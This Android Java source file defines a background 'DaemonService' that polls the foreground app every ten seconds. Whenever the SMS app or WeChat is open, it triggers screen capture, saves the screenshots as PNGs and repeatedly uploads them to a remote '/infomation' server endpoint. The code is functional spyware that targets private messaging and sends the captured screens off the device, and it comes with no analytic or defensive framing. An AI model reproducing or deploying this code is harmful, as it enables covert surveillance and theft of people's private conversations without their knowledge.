package screen.com.myapplication;

import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Binder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Process;
import android.util.Log;

import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.Vector;

import cz.msebera.android.httpclient.Header;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class RecordService extends Service {


    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader mImageReader;

    private boolean running;
    private int width = 720;
    private int height = 1080;
    private int dpi;

    public final static String TAG = "DaemonService";

    private String  currentAppName = "";

    private long mUploadDaleyMillis = 15000; // 上传时间/毫秒
    private long mRecordDaleyMillis = 10000; // 截图时间/毫秒
    private String mSaveImageDir = Environment.getExternalStorageDirectory().getPath()+"/Pictures/";



    @Override
    public IBinder onBind(Intent intent) {
        return new RecordBinder();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,"onStartCommand");
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        HandlerThread serviceThread = new HandlerThread("service_thread", Process.THREAD_PRIORITY_BACKGROUND);
        serviceThread.start();
        autoTakePhoto();   // 自动截屏
        autoUploadPhoto(); // 自动上传截图
        running = false;
    }

    public void setMediaProject(MediaProjection project) {
        mediaProjection = project;
    }

    public boolean isRunning() {
        return running;
    }

    public void setConfig(int width,int height,int dpi){
        this.width = width;
        this.height = height;
        this.dpi = dpi;
    }

    public boolean startRecord(){
        if(mediaProjection == null || running){
            return false;
        }

        mImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
        createVirtualDisplay();
        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader argImageReader) {
                try{
                    initRecorder(mImageReader);
                }catch (IllegalStateException argE){
                }catch (NullPointerException argE){}
                stopRecord();
            }
        },new Handler());

        running = true;
        return true;
    }

    public boolean stopRecord() {
        if (!running) {
            return false;
        }
        running = false;

        if( virtualDisplay!=null){
            virtualDisplay.release();
        }

        mediaProjection.stop();

        return true;
    }

    private void createVirtualDisplay() {
        virtualDisplay = mediaProjection.createVirtualDisplay("MainScreen", width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mImageReader.getSurface(), null, null);
    }

    private void initRecorder(ImageReader argImageReader) {


        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss");
        String strDate = dateFormat.format(new java.util.Date());
        String pathImage = mSaveImageDir;

        //检测目录是否存在
        File localFileDir = new File(pathImage);
        if(!localFileDir.exists())
        {
            localFileDir.mkdirs();
            Log.d("DaemonService","创建Pictures目录成功");
        }

        String nameImage = pathImage+strDate+".png";

        Image localImage = argImageReader.acquireLatestImage();

        // 4.1 获取图片信息，转换成bitmap
        int width = argImageReader.getWidth();
        int height = argImageReader.getHeight();


        final Image.Plane[] localPlanes = localImage.getPlanes();
        final ByteBuffer localBuffer = localPlanes[0].getBuffer();
        int pixelStride = localPlanes[0].getPixelStride();
        int rowStride = localPlanes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;

        // 4.1 Image对象转成bitmap
        Bitmap localBitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
        localBitmap.copyPixelsFromBuffer(localBuffer);
        localBitmap.createBitmap(localBitmap, 0, 0, width, height);

        if (localBitmap != null) {
            File f = new File(nameImage);
            if (f.exists()) {
                f.delete();
            }
            try {
                FileOutputStream out = new FileOutputStream(f);
                localBitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
                out.flush();
                out.close();
                Log.d("DaemonService", "startCapture-> 保存文件成功："+nameImage);


            } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

    }

    public class RecordBinder extends Binder {
        public RecordService getRecordService() {
            return RecordService.this;
        }
    }

    public void autoTakePhoto(){

        final Handler localHandler = new Handler();
        Runnable localRunnable = new Runnable() {
            @Override
            public void run() {

                //Log.d(TAG,"定时函数");

                // 获取topApp包名
                getTopApp(RecordService.this);

                // 定时x秒，调用Activity，当Activity被激活的时候，自动开始申请权限，并截图
                if(currentAppName.contains("com.android.messaging") || currentAppName.contains("com.tencent.mm")){
                    Intent localIntent = new Intent();
                    localIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    localIntent.setClass(RecordService.this,MainActivity.class);
                    startActivity(localIntent);
                }

                // 延迟x秒，重复执行run函数
                localHandler.postDelayed(this,mRecordDaleyMillis);
            }
        };

        localHandler.post(localRunnable);

    }

    public void autoUploadPhoto(){

        final Handler localHandler = new Handler();
        Runnable localRunnable = new Runnable() {
            @Override
            public void run() {

                getFiles(mSaveImageDir);
                // 延迟x秒，重复执行run函数
                localHandler.postDelayed(this,mUploadDaleyMillis);
            }
        };

        localHandler.post(localRunnable);

    }

    public void getFiles(String fileAbsolutePath) {

        File file = new File(fileAbsolutePath);
        File[] subFile = file.listFiles();
        for (int iFileLength = 0; iFileLength < subFile.length; iFileLength++) {
            // 判断是否为文件夹
            if (!subFile[iFileLength].isDirectory()) {
                String filename = subFile[iFileLength].getName();
                // 判断是否为PNG结尾
                if (filename.trim().toLowerCase().endsWith(".png")) {
                    Log.d(TAG,"Waiting for upload file:"+ filename);

                    // 上传文件
                    uploadFile(subFile[iFileLength].getAbsolutePath());
                    return;
                }
            }
        }
    }

    public void uploadFile(String argPath){


        File localFile = new File(argPath);
        RequestParams localParams = new RequestParams();
        try {
            localParams.put("screenshot",localFile);
        } catch (FileNotFoundException argE) {
            argE.printStackTrace();
        }

        RestClient.post("/infomation", localParams, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                Log.d(TAG,"上传文件成功"+ new String(responseBody));

            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG,"上传文件失败, 错误原因：");
                Log.d(TAG,error.getMessage());
            }
        });
    }

    private void getTopApp(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            UsageStatsManager m = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            if (m != null) {
                long now = System.currentTimeMillis();
                //获取60秒之内的应用数据
                List<UsageStats> stats = m.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 60 * 1000, now);

                //取得最近运行的一个app，即当前运行的app
                if ((stats != null) && (!stats.isEmpty())) {
                    int j = 0;
                    for (int i = 0; i < stats.size(); i++) {
                        if (stats.get(i).getLastTimeUsed() > stats.get(j).getLastTimeUsed()) {
                            j = i;
                        }
                    }
                    currentAppName = stats.get(j).getPackageName();
                }
                Log.d(TAG, "top running app is : "+currentAppName);
            }
        }
    }
}
